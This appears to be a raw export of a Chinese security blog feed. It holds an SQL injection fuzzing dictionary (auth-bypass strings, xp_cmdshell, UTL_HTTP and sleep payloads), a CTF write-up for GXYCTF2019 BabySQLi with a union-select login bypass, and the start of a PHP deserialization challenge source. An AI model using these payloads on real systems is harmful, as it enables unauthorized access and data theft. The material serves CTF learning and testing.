class="hljs-string">&#x27;)%20or%20(&#x27;</span>x<span class="hljs-string">&#x27;=&#x27;</span>x<br><span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-string">&#x27; or 0=0 --</span><br><span class="hljs-string">&quot; or 0=0 --</span><br><span class="hljs-string">or 0=0 --</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> #<br> <span class="hljs-keyword">or</span> <span class="hljs-number">0</span><span class="hljs-operator">=</span><span class="hljs-number">0</span> #&quot;<br>or 0=0 #<br>&#x27; or 1=1--<br>&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or &#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;=&#x27;</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;--</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-comment">--&#x27;</span><br><span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">--</span><br><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-keyword">or</span><span class="hljs-operator">%</span><span class="hljs-number">201</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br><span class="hljs-string">&#x27; or 1=1 or &#x27;&#x27;=&#x27;</span><br> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">or</span> &quot;&quot;<span class="hljs-operator">=</span><br><span class="hljs-string">&#x27; or a=a--</span><br><span class="hljs-string"> or a=a</span><br><span class="hljs-string">&#x27;</span>) <span class="hljs-keyword">or</span> (<span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;a</span><br><span class="hljs-string">) or (a=a</span><br><span class="hljs-string">hi or a=a</span><br><span class="hljs-string">hi or 1=1 --&quot;</span><br><span class="hljs-string">hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-comment">--</span><br>hi<span class="hljs-string">&#x27; or &#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br>hi<span class="hljs-string">&#x27;) or (&#x27;</span>a<span class="hljs-string">&#x27;=&#x27;</span>a<br>&quot;hi&quot;&quot;) or (&quot;&quot;a&quot;&quot;=&quot;&quot;a&quot;<br><span class="hljs-string">&#x27;hi&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;x&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;x&#x27;</span>;<br><span class="hljs-variable">@variable</span><br>,<span class="hljs-variable">@variable</span><br>PRINT<br>PRINT @<span class="hljs-variable">@variable</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">procedure</span><br>limit<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span><br><span class="hljs-keyword">asc</span><br><span class="hljs-keyword">desc</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">distinct</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">truncate</span><br>replace<br><span class="hljs-keyword">like</span><br>handler<br>bfilename<br><span class="hljs-string">&#x27; or username like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or uname like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or userid like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or uid like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-string">&#x27; or user like &#x27;</span><span class="hljs-operator">%</span><br><span class="hljs-keyword">exec</span> xp<br><span class="hljs-keyword">exec</span> sp<br><span class="hljs-string">&#x27;; exec master..xp_cmdshell</span><br><span class="hljs-string">&#x27;</span>; <span class="hljs-keyword">exec</span> xp_regread<br>t<span class="hljs-string">&#x27;exec master..xp_cmdshell &#x27;</span>nslookup www.google.com<span class="hljs-string">&#x27;--</span><br><span class="hljs-string">--sp_password</span><br><span class="hljs-string">\x27UNION SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span><br><span class="hljs-string">&#x27; UNION ALL SELECT</span><br><span class="hljs-string">&#x27;</span> <span class="hljs-keyword">or</span> (<span class="hljs-keyword">EXISTS</span>)<br><span class="hljs-string">&#x27; (select top 1</span><br><span class="hljs-string">&#x27;</span><span class="hljs-operator">||</span>UTL_HTTP.REQUEST<br><span class="hljs-number">1</span>;<span class="hljs-keyword">SELECT</span><span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">*</span><br>to_timestamp_tz<br>tz_offset<br><span class="hljs-operator">&lt;&gt;</span>&quot;&#x27;%;)(&amp;+<br>&#x27;%20or%201=1<br>%27%20or%201=1<br>%20$(sleep%2050)<br>%20&#x27;sleep%2050&#x27;<br>char%4039%41%2b%40SELECT<br>&amp;apos;%20OR<br>&#x27;sqlattempt1<br>(sqlattempt2)<br>|<br>%7C<br>*|<br>%2A%7C<br>*(|(mail=*))<br>%2A%28%7C%28mail%3D%2A%29%29<br>*(|(objectclass=*))<br>%2A%28%7C%28objectclass%3D%2A%29%29<br>(<br>%28<br>)<br>%29<br>&amp;<br>%26<br>!<br>%21<br>&#x27; or 1=1 or &#x27;&#x27;=&#x27;<br>&#x27; or &#x27;&#x27;=&#x27;<br>x&#x27; or 1=1 or &#x27;x&#x27;=&#x27;y<br>/<br>//<br>//*<br>*/*<br>a&#x27; or 3=3--<br>&quot;a&quot;&quot; <span class="hljs-keyword">or</span> <span class="hljs-number">3</span><span class="hljs-operator">=</span><span class="hljs-number">3</span><span class="hljs-comment">--&quot;</span><br><span class="hljs-string">&#x27; or 3=3</span><br><span class="hljs-string">‘ or 3=3 --</span><br></code></pre></td></tr></table></figure><h2 id="字典2-1"><a href="#字典2-1" class="headerlink" title="字典2"></a>字典2</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">length <br>Length<br>+<br><span class="hljs-keyword">handler</span><br><span class="hljs-keyword">like</span><br><span class="hljs-keyword">LiKe</span><br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SeleCT</span> <br>sleep<br>SLEEp<br><span class="hljs-keyword">database</span><br><span class="hljs-keyword">DATABASe</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">having</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">oR</span><br><span class="hljs-keyword">as</span><br><span class="hljs-keyword">As</span><br>-~<br>BENCHMARK<br><span class="hljs-keyword">limit</span><br><span class="hljs-keyword">LimIt</span><br>left<br>Left<br><span class="hljs-keyword">select</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">insert</span><br><span class="hljs-keyword">insERT</span><br><span class="hljs-keyword">INSERT</span><br>right<br>#<br><span class="hljs-comment">--+</span><br>INFORMATION<br><span class="hljs-comment">--</span><br>;<br>!<br>%<br>+<br>xor<br>&lt;&gt;<br>(<br>&gt;<br>&lt;<br>)<br>.<br>^<br>=<br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">ANd</span><br><span class="hljs-keyword">BY</span><br><span class="hljs-keyword">By</span><br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br><span class="hljs-keyword">COlumn</span><br>COUNT<br>Count<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">END</span><br><span class="hljs-keyword">case</span><br><span class="hljs-string">&#x27;1&#x27;</span>=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">when</span><br><span class="hljs-string">admin&#x27;</span><br>&quot;<br>length <br>+<br>REVERSE<br><br>ascii<br>ASSIC<br>ASSic<br>select <br>database<br>left<br>right<br>union<br>UNIon<br>UNION<br>&quot;<br>&amp;<br>&amp;&amp;<br>||<br>oorr<br>/<br>//<br>/<span class="hljs-comment">/*</span><br><span class="hljs-comment">*/</span>*<br><span class="hljs-comment">/**/</span><br>anandd<br><span class="hljs-keyword">GROUP</span><br><span class="hljs-keyword">HAVING</span><br><span class="hljs-keyword">IF</span><br><span class="hljs-keyword">INTO</span><br><span class="hljs-keyword">JOIN</span><br>LEAVE<br>LEFT<br><span class="hljs-keyword">LEVEL</span><br>sleep<br><span class="hljs-keyword">LIKE</span><br>NAMES<br>NEXT<br><span class="hljs-keyword">NULL</span><br><span class="hljs-keyword">OF</span><br><span class="hljs-keyword">ON</span><br>|<br>infromation_schema<br><span class="hljs-keyword">user</span><br><span class="hljs-keyword">OR</span><br><span class="hljs-keyword">ORDER</span><br>ORD<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">USER</span><br><span class="hljs-keyword">USING</span><br><span class="hljs-keyword">VALUE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-keyword">ADD</span><br><span class="hljs-keyword">AND</span><br><span class="hljs-keyword">prepare</span><br><span class="hljs-keyword">set</span><br><span class="hljs-keyword">update</span><br><span class="hljs-keyword">delete</span><br><span class="hljs-keyword">drop</span><br>inset<br><span class="hljs-keyword">CAST</span><br><span class="hljs-keyword">COLUMN</span><br>CONCAT<br>GROUP_CONCAT<br>group_concat<br><span class="hljs-keyword">CREATE</span><br><span class="hljs-keyword">DATABASE</span><br>DATABASES<br><span class="hljs-keyword">alter</span><br><span class="hljs-keyword">DELETE</span><br><span class="hljs-keyword">DROP</span><br>floor<br>rand()<br>information_schema.<span class="hljs-keyword">tables</span><br>TABLE_SCHEMA<br>%df<br>concat_ws()<br>concat<br><span class="hljs-keyword">LIMIT</span><br>ORD<br><span class="hljs-keyword">ON</span><br>extractvalue<br><span class="hljs-keyword">order</span> <br>CAST()<br><span class="hljs-keyword">by</span><br><span class="hljs-keyword">ORDER</span><br>OUTFILE<br><span class="hljs-keyword">RENAME</span><br>REPLACE<br><span class="hljs-keyword">SCHEMA</span><br><span class="hljs-keyword">SELECT</span><br><span class="hljs-keyword">SET</span><br>updatexml<br><span class="hljs-keyword">SHOW</span><br><span class="hljs-keyword">SQL</span><br><span class="hljs-keyword">TABLE</span><br><span class="hljs-keyword">THEN</span><br><span class="hljs-keyword">TRUE</span><br>instr<br>benchmark<br><span class="hljs-keyword">format</span><br>bin<br>substring<br>ord<br><br><span class="hljs-keyword">UPDATE</span><br><span class="hljs-keyword">VALUES</span><br><span class="hljs-type">VARCHAR</span><br><span class="hljs-keyword">VERSION</span><br><span class="hljs-keyword">WHEN</span><br><span class="hljs-keyword">WHERE</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">`</span><br><span class="hljs-comment">  </span><br><span class="hljs-comment">,</span><br><span class="hljs-comment">users</span><br><span class="hljs-comment">%0a</span><br><span class="hljs-comment">%0A</span><br><span class="hljs-comment">%0b</span><br><span class="hljs-comment">mid</span><br><span class="hljs-comment">for</span><br><span class="hljs-comment">BEFORE</span><br><span class="hljs-comment">REGEXP</span><br><span class="hljs-comment">RLIKE</span><br><span class="hljs-comment">in</span><br><span class="hljs-comment">sys schemma</span><br><span class="hljs-comment">SEPARATOR</span><br><span class="hljs-comment">XOR</span><br><span class="hljs-comment">CURSOR</span><br><span class="hljs-comment">FLOOR</span><br><span class="hljs-comment">sys.schema_table_statistics_with_buffer</span><br><span class="hljs-comment">INFILE</span><br><span class="hljs-comment">count</span><br><span class="hljs-comment">%0c</span><br><span class="hljs-comment">from</span><br><span class="hljs-comment">%0d</span><br><span class="hljs-comment">%a0</span><br><span class="hljs-comment">=</span><br><span class="hljs-comment">@</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">%27</span><br><span class="hljs-comment">%23</span><br><span class="hljs-comment">%22</span><br><span class="hljs-comment">%20</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>sql注入</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
      <tag>sql注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] GXYCTF2019-BabySQLi</title>
    <link href="/2022/12/11/%5Bctf-web%5D%20GXYCTF2019-BabySQLi/"/>
    <url>/2022/12/11/%5Bctf-web%5D%20GXYCTF2019-BabySQLi/</url>
    
    <content type="html"><![CDATA[<h1 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h1><p>进入就是登录界面，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214837774.png" alt="image-20221211214837774"></p><p>尝试之后，在源码页面发现提示，</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221211214910324.png" alt="image-20221211214910324"></p><p>先用base32解码，然后base64解码，</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span><br></code></pre></td></tr></table></figure><p>接下来尝试，发现过滤了<code>or</code>，<code>=</code>，<code>()</code>，<code>or</code>可以使用<code>Or</code>绕过，<code>=</code>可以用<code>&lt;&gt;</code>绕过，<code>()</code>倒是没想到什么好的办法，使用</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">admin</span>&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>#<br></code></pre></td></tr></table></figure><p>确定了有3列，之后就不会了。</p><p>使用的是虚拟表（大概），使用这样的语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,md5(<span class="hljs-string">&#x27;abc&#x27;</span>);<br></code></pre></td></tr></table></figure><p>返回结果为：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/20163356-f177be36d62355a1.png" alt="img"></p><p>意味着联合查询会构造一个虚拟表，这个表中的数据并没有保存，只是临时存在的，所以如果构造这样的语句：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">xx&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-symbol">&#x27;admin</span><span class="hljs-string">&#x27;,&#x27;</span>c4ca4238a0b923820dcc509a6f75849b&#x27;#<br></code></pre></td></tr></table></figure><p>这里<code>c4ca4238a0b923820dcc509a6f75849b</code>是<code>MD5(1)</code>的值，密码使用<code>1</code>，就可以登录成功了。</p><p>[<a href="https://www.jianshu.com/p/6fd932f883cd">GXYCTF2019] BabySQli WriteUp - 简书 (jianshu.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>sql注入</category>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>ctf</tag>
      
      <tag>ctf-web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[ctf-web] 网鼎杯2020青龙组-AreUSerialz</title>
    <link href="/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/"/>
    <url>/2022/12/08/%5Bctf-web%5D%20%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUserialz/</url>
    
    <content type="html"><![CDATA[<h1 id="网鼎杯-2020-青龙组-AreUSerialz"><a href="#网鼎杯-2020-青龙组-AreUSerialz" class="headerlink" title="[网鼎杯 2020 青龙组]AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h1><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br> <br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br> <br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$op</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$content</span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$op</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;/tmp/tmpfile&quot;</span>;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br> <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">process</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;1&quot;</span>) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">write</span>();<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op == <span class="hljs-string">&quot;2&quot;</span>) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">read</span>();<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-variable">$res</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Bad Hacker!&quot;</span>);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;content)) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>((<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;content) &gt; <span class="hljs-number">100</span>) &#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Too long!&quot;</span>);<br>                <span class="hljs-keyword">die</span>();<br>            &#125;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename, <span class="hljs-variable">$this</span>-&gt;content);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$res</span>) <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Successful!&quot;</span>);<br>            <span class="hljs-keyword">else</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">output</span>(<span class="hljs-string">&quot;Failed!&quot;</span>);<br>        &#125;<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">read</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$res</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;filename)) &#123;<br>            <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$res</span>;<br>    &#125;<br> <br>    <span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">output</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;[Result]: &lt;br&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$s</span>;<br>    &#125;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;op === <span class="hljs-string">&quot;2&quot;</span>)<br>            <span class="hljs-variable language_">$this</span>-&gt;op = <span class="hljs-string">&quot;1&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">process</span>();<br>    &#125;<br> <br>&#125;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_valid</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>) </span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$s</span>); <span class="hljs-variable">$i</span>++)<br>        <span class="hljs-keyword">if</span>(!(<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$s</span>[<span class="hljs-variable">$i</span>]) &gt;= <span class="hljs-number">32</span> &amp;&amp; <span class="hljs-title 